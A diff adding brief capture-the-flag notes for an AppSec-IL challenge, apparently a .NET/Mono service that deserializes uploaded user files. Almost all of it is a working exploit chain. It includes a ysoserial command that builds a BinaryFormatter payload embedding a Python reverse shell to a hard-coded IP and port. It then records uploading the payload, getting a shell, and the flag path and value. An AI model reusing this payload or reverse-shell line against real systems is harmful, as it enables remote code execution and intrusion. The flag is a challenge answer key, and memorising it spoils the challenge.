@@ -1,0 +1,11 @@
+Upload exampleuser.bin
+	{"<id>k__BackingField":0,"<UserName>k__BackingField":"ExampleUser","<Permission>k__BackingField":"Guest"}
+
+k__BackingField => C#, .Net
+
+.\ysoserial.exe -g TypeConfuseDelegateMono -f BinaryFormatter --output raw --rawcmd -c "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"140.113.24.143\",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'" > exploit.bin
+
+Upload exploit.bin
+	get reverse shell
+/etc/mono_apps/WhoAmI_Challenge/flag
+	AppSec-IL{M0N0_Y_Y0u_4r3_S0_S3r14l}
